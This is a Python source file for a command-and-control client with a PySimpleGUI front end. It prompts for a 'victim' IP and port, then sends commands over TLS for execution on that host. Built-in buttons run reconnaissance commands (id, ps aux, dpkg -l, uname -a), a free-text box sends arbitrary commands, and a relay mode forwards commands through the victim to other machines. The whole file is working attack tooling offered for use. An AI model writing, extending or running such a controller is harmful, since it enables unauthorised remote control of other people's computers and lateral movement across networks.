import socket
import ssl
import PySimpleGUI as sg
import sys

def menu(cert ,key, host ,port):
    # Define the window's contents
    layout = [[sg.Text('Not Setup', background_color='red',key='-OUT-')],
             [sg.Checkbox('Setup', size=(100,1))],
             [sg.Checkbox('Enumeration', auto_size_text=True)],
             [sg.Checkbox('Live Commands', auto_size_text=True)],
             [sg.Checkbox('Relay Commands', auto_size_text=True)],

             [sg.Button('Ok'), sg.Button('Quit')]]

    # Create the window
    window = sg.Window('MAIN MENU', layout)

    # Display and interact with the Window using an Event Loop
    while True:
        event, values = window.read()
        # See if user wants to quit or window was closed
        if event == sg.WINDOW_CLOSED or event == 'Quit':
            break
        elif ((values[0]==True) and (host ==0)):
            options=setup()
            host=options[0]
            port=options[1]
            window['-OUT-'].update('all setup:ip:'+str(host)+' and port:'+str(port), background_color='green')  # show the event and values in the window
            window.refresh()
        elif (values[0]==False and (host ==0)):
            window['-OUT-'].update('Not Setup', background_color='red')  # show the event and values in the window
            window.refresh()
        elif (values[1]==True):
            interact_built(cert ,host ,port)
        elif (values[2]==True):
            interact_GUI(cert , host ,port)
        elif (values[3]==True):
            Relay_GUI(cert , host ,port)
        elif (host ==0):
            window['-OUT-'].update('Not Setup', background_color='red')  # show the event and values in the window
            window.refresh()
        elif (host !=0):
            window['-OUT-'].update('all setup:ip:'+str(host)+' and port:'+str(port), background_color='green')  # show the event and values in the window
            window.refresh()    
    # Finish up by removing from the screen
    window.close()
def interact_built(cert ,host ,port):
    sg.theme('DarkGrey14')
    # Define the window's contents
    layout = [[sg.Text('Script/Commands to execute', size=(40, 1))],
             [sg.Button('ID')],
             [sg.Button('Processes')],
             [sg.Button('Programs')],
             [sg.Button('OS Type')],
             [sg.Output(size=(88, 20), font='Courier 10')],

             [sg.Button('Ok'), sg.Button('Quit')]]

    # Create the window
    window = sg.Window('Built In Commands', layout)

    # Display and interact with the Window using an Event Loop
    while True:
        event, values = window.read()
        # See if user wants to quit or window was closed
        if event == sg.WINDOW_CLOSED or event == 'Quit':
            break
        elif (event=='ID'):
            interact(cert, host, port, 'id')
        elif (event=='Processes'):
            interact(cert, host, port, 'ps aux')
        elif (event=='Programs'):
            interact(cert, host, port, 'dpkg -l')
        elif (event=='OS Type'):
            interact(cert, host, port, 'uname -a')
    # Finish up by removing from the screen
    window.close()
def interact_GUI(cert ,host ,port):
    sg.theme('DarkGrey14')

    layout = [
        [sg.Text('Script/Commands to execute (for relay "relay ip port command")', size=(40, 1))],
        [sg.Output(size=(88, 20), font='Courier 10')],
        [sg.Button('Quit')],
        [sg.Text('Manual command', size=(15, 1)), sg.Input(focus=True, key='-IN-'), sg.Button('Run', bind_return_key=True)]
    ]

    window = sg.Window('Script launcher', layout)

    # ---===--- Loop taking in user input and using it to call scripts --- #

    while True:
        event, values = window.read()
        if event == sg.WINDOW_CLOSED or event == 'Quit':
            break
        elif event == 'Run':
            args = values['-IN-'].split(' ')
            print(f'Running {values["-IN-"]} args={args[0], *args[1:]}')
            create_argument=(args[0], *args[1:])
            argument=' '.join(create_argument)
            interact(cert ,host ,port ,argument)
def Relay_GUI(cert ,host ,port):
    sg.theme('DarkGrey14')

    layout = [
        [sg.Text('Relay commands to be executed', size=(40, 1))],
        [sg.Output(size=(88, 20), font='Courier 10')],
        [sg.Text('Relay IP', size=(15, 1)), sg.InputText()],
        [sg.Text('Relay Port', size=(15, 1)), sg.InputText()],
        [sg.Button('Quit')],
        [sg.Text('Manual command', size=(15, 1)), sg.Input(focus=True, key='-IN-'), sg.Button('Run', bind_return_key=True)]
    ]

    window = sg.Window('Script launcher', layout)

    # ---===--- Loop taking in user input and using it to call scripts --- #

    while True:
        event, values = window.read()
        if event == sg.WINDOW_CLOSED or event == 'Quit':
            break
        elif event == 'Run':
            args = values['-IN-'].split(' ')
            print(f'Running {values["-IN-"]} args={args[0], *args[1:]}')
            create_argument=(args[0], *args[1:])
            argument=' '.join(create_argument)
            argument="relay "+str(values[0])+" "+str(values[1])+" "+str(argument)
            interact(cert ,host ,port ,argument)
def setup():   
    sg.theme('Topanga')      # Add some color to the window

    # Very basic window.  Return values using auto numbered keys

    layout = [
        [sg.Text('Please enter your Victims IP and port to run')],
        [sg.Text('Vicims IP', size=(15, 1)), sg.InputText()],
        [sg.Text('Port', size=(15, 1)), sg.InputText()],
        [sg.Submit(), sg.Cancel()]
    ]

    window = sg.Window('Simple data entry window', layout)
    event, values = window.read()
    window.close()
    test=values[0]
    test2=values[1]

    return test,test2

def interact(cert,host ,port ,data="id"):

    #Needs cert and key generated:
    #openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365


    context = ssl.SSLContext() #Defaults to TLS 
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations(cert)
    with socket.create_connection((host, port)) as sock:
        #Create secure socket
        ssock=context.wrap_socket(sock, server_hostname=host)
        print(ssock.version())
        print(ssock.getpeercert())
        ssock.send(data.encode())
        command_split=data.split(" ")
        if (command_split[0]=="relay"): #Nicely close the encrypted channel
            print ("relayed")
        else:
            while 1:
                recieve = ssock.recv(1024)
                if (recieve  !=0):
                    break
                print(f"Recieved: {recieve}")
            print(f"Recieved: {recieve}")
            ssock.shutdown(2) #Nicely close the encrypted channel
def get_host_info(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    host=(s.getsockname()[0])
    s.close()
    return host
if __name__=="__main__":
    port = 4000
    host= '192.168.237.129'
    cert="./cert.pem"
    key="./key.pem"
    print(len(sys.argv))
    if ((len(sys.argv))>=2):
        if (sys.argv[1]=="h"):
            print("""
            host = -u
            port = -p
            command = -c
            example:
            python3 client.py -u '192.1168.237.129' -p '3000' -c 'ls'
    """)
        elif (sys.argv[1]=="-u"):
            host=sys.argv[2]
            print(host)
            if (sys.argv[3]=="-p"):
                port=sys.argv[4]
                print(port)
                if (sys.argv[5]=="-c"):
                    command=sys.argv[6]
                    print(command)
                    interact(cert, host, port, command)
                else:
                    print("forgot to add the command argument '-c'")
            else:
                print("forgot to add the port argument '-p'")
        else:
            print("""
            host = -u
            port = -p
            command = -c
    """)
    else:
        menu(cert ,key, host ,port)